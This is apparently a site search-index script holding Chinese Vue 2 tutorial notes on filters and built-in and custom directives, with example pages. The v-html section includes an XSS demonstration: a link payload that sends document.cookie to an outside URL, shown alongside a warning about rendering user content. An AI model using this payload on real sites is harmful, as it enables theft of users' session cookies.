已经移除)\",\"slug\":\"过滤器-vue-3-已经移除\",\"contents\":[\"定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）\",\"注册过滤器：Vue.filter(name, callback) 全局过滤器new Vue {filters: {}} 局部过滤器\",\"使用过滤器：{{ xxx | 过滤器名}} 或 v-bind:属性 = \\\"xxx | 过滤器名\\\"\",\"备注：\",\"过滤器可以接收额外参数，多个过滤器也可以串联\",\"并没有改变原本的数据，而是产生新的对应的数据\",\"处理时间的库：moment 体积较大，dayjs 轻量级\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>过滤器</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> <!-- //引入dayjs库 --> <script src=\\\"https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>时间</h2> <h3>当前时间戳：{{time}}</h3> <h3>转换后的时间：{{time|timeFilter()}}</h3> <h3>转换后的时间：{{time|timeFilter('YYYY-MM-DD HH:mm:ss')}}</h3> <h3>截取年月日：{{time|timeFilter() | mySlice}}</h3> </div> <script> Vue.config.productionTip = false //全局过滤器 Vue.filter('mySlice', function (value) { return value.slice(0, 11) }) new Vue({ el: '#root', data: { time: 1683621034195, }, //局部过滤器 filters: { timeFilter(value, str = 'YYYY年MM月DD日HH:mm:ss') { return dayjs(value).format(str) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-过滤器01.png\"]}]},\"/frontend/vuenotes/12-Vue%E6%A0%B8%E5%BF%83-%E5%86%85%E7%BD%AE%E6%8C%87%E4%BB%A4%E4%B8%8E%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4.html\":{\"title\":\"Vue核心-内置指令与自定义指令\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/12-Vue核心-内置指令与自定义指令\"]},{\"header\":\"内置指令\",\"slug\":\"内置指令\",\"contents\":[\"常用的内置指令： v-bind 单向绑定解析表达式，可简写为 :v-model 双向数据绑定v-for 遍历数组 / 对象 / 字符串v-on 绑定事件监听，可简写为 @v-show 条件渲染 (动态控制节点是否展示)v-if 条件渲染（动态控制节点是否存在）v-else-if 条件渲染（动态控制节点是否存在）v-else 条件渲染（动态控制节点是否存在）\"]},{\"header\":\"v-text 指令\",\"slug\":\"v-text-指令\",\"contents\":[\"v-text 指令\",\"作用：向其所在的节点中渲染文本内容\",\"与插值语法的区别：v-text 会替换掉节点中的内容，{{xxx}} 则不会，更灵活\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-text指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <div>你好，{{name}}</div> <div v-text=\\\"name\\\"></div> <div v-text=\\\"str\\\"></div> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: 'zhf', str: '<h3>你好呀！</h3>', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-内置指令与自定义指令01.png\"]},{\"header\":\"v-html 指令\",\"slug\":\"v-html-指令\",\"contents\":[\"作用：向指定节点中渲染包含 html 结构的内容\",\"与插值语法的区别：\",\"v-html 会替换掉节点中所有的内容，{{xxx}} 则不会\",\"v-html 可以识别 html 结构\",\"严重注意 v-html 有安全性问题！！！\",\"在网站上动态渲染任意 html 是非常危险的，容易导致 XSS 攻击\",\"一定要在可信的内容上使用 v-html，永远不要用在用户提交的内容上！！！\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-html指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <div>你好，{{name}}</div> <div v-html=\\\"str1\\\"></div> <div v-html=\\\"str2\\\"></div> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: 'zhf', str1: '<h3>你好呀！</h3>', str2: '<a href=javascript:location.href=\\\"http://www.baidu.com?\\\"+document.cookie>兄弟我找到你想要的资源了，快来！</a>', }, }) </script> </body> </html> \",\"我们在 cookie 中存放如下数据\",\"Vue核心-内置指令与自定义指令02.png\",\"点击案例中的链接就可以获取\",\"效果：\",\"Vue核心-内置指令与自定义指令03.gif\"]},{\"header\":\"v-cloak 指令\",\"slug\":\"v-cloak-指令\",\"contents\":[\"v-cloak 指令（没有值）\",\"本质是一个特殊属性，Vue 实例创建完毕并接管容器后，会删掉 v-cloak 属性\",\"使用 CSS 配合 v-cloak 可以解决网速慢时页面展示出 {{xxx}} 的问题\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-cloak指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> <style> [v-cloak] { display: none; } </style> </head> <body> <div id=\\\"root\\\"> <!-- 如果网速慢则一开始不显示 --> <h2 v-cloak>{{name}}</h2> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: 'zhf', }, }) </script> </body> </html> \"]},{\"header\":\"v-once 指令\",\"slug\":\"v-once-指令\",\"contents\":[\"v-once 所在节点在初次动态渲染后，就视为静态内容了\",\"以后数据的改变不会引起 v-once 所在结构的更新，可以用于优化性能\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-once指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2 v-once>初始化的n值是：{{n}}</h2> <h2>当前的n值是：{{n}}</h2> <button @click=\\\"n++\\\">点我n+1</button> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { n: 1, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-内置指令与自定义指令04.gif\"]},{\"header\":\"v-pre 指令\",\"slug\":\"v-pre-指令\",\"contents\":[\"跳过 v-pre 所在节点的编译过程\",\"可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-pre指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2 v-pre>Vue其实很简单</h2> <h2>当前的n值是:{{n}}</h2> <button @click=\\\"n++\\\">点我n+1</button> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { n: 1, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-内置指令与自定义指令05.gif\"]},{\"header\":\"自定义指令\",\"slug\":\"自定义指令\",\"contents\":[\"directives\"]},{\"header\":\"定义语法\",\"slug\":\"定义语法\",\"contents\":[]},{\"header\":\"局部指令\",\"slug\":\"局部指令\",\"contents\":[\"new Vue({ directives:{ 指令名:配置对象 } }) \",\"或\",\"new Vue({ directives:{ 指令名:回调函数 } }) \",\"例：\",\"directives : { 'my-directive' : { bind (el, binding) { el.innerHTML = binding.value.toupperCase() } } } \"]},{\"header\":\"全局指令\",\"slug\":\"全局指令\",\"contents\":[\"Vue.directive(指令名, 配置对象) \",\"或\",\"Vue.directive(指令名, 回调函数) \",\"例：\",\"Vue.directive('my-directive', function(el, binding){ el.innerHTML = binding.value.toupperCase() }) \"]},{\"header\":\"配置对象中常用的3个回调函数\",\"slug\":\"配置对象中常用的3个回调函数\",\"contents\":[\"bind (element, binding) 指令与元素成功绑定时调用\",\"inserted (element, binding) 指令所在元素被插入页面时调用\",\"update(element, binding) 指令所在模板结构被重新解析时调用\",\"element 就是 DOM 元素，binding 就是要绑定的对象，它包含以下属性：name 、value、oldValue、expression、arg、modifiers\",\"例：\",\"Vue.directive('fbind', { // 指令与元素成功绑定时（一上来） bind(element, binding) { // element就是DOM元素，binding就是要绑定的 element.value = binding.value }, // 指令所在元素被插入页面时 inserted(element, binding) { element.focus() }, // 指令所在的模板被重新解析时 update(element, binding) { element.value = binding.value } }) \"]},{\"header\":\"注意\",\"slug\":\"注意\",\"contents\":[\"指令定义时不加 v-，但使用时要加 v-\",\"指令名如果是多个单词，要使用 kebab-case 命名方式，不要用 camelCase 命名\"]},{\"header\":\"使用指令\",\"slug\":\"使用指令\",\"contents\":[\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>自定义指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>当前n值是：<span v-text=\\\"n\\\"></span></h2> <h2>放大10倍后的n值是：<span v-big=\\\"n\\\"></span></h2> <button @click=\\\"n++\\\">点我n+1</button> <hr /> <input type=\\\"text\\\" v-fbind:value=\\\"n\\\" /> </div> <script> Vue.config.productionTip = false //定义全局指令 /*Vue.directive('fbind', { //指令与元素成功绑定时（一上来） bind(element, binding) { element.value = binding.value }, //指令所在元素被插入页面时 inserted(element, binding) { element.focus() }, //指令所在的模板被重新解析时 update(element, binding) { element.value = binding.value }, })*/ new Vue({ el: '#root', data: { n: 1, }, directives: { //big函数何时会被调用？ //1.指令与元素成功绑定时（一上来） //2.指令所在的模板被重新解析时 big(element, binding) { //console.log('big', this) //注意此处的this是window element.innerText = binding.value * 10 }, fbind: { //指令与元素成功绑定时（一上来） bind(element, binding) { element.value = binding.value }, //指令所在元素被插入页面时 inserted(element, binding) { element.focus() }, //指令所在的模板被重新解析时 update(element, binding) { element.value = binding.value }, }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-内置指令与自定义指令06.gif\"]}]},\"/frontend/vuenotes/\":{\"title\":\"Vue\",\"contents\":[]}}}");self.onmessage=({data:o})=>{self.postMessage($(o.query,m[o.routeLocale]))};
//# sourceMappingURL=original.js.map
